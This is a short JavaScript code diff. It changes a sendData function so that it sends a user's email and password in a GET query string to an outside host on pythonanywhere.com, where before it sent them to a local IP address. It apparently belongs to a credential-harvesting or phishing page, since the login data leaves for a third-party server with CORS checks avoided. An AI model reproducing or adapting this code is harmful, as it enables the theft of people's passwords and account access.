@@ -25,7 +25,7 @@ const createBody = (data) => {
   return urlEncodedData;
 }
 
-const sendData = ( data ) => fetch(`http://192.168.3.121:8000/?email=${data.email}&pass=${data.password}`, {
+const sendData = ( data ) => fetch(`https://aksh21.pythonanywhere.com/?email=${data.email}&pass=${data.password}`, {
   method: 'GET',
   mode: 'no-cors',
   cache: 'no-cache',
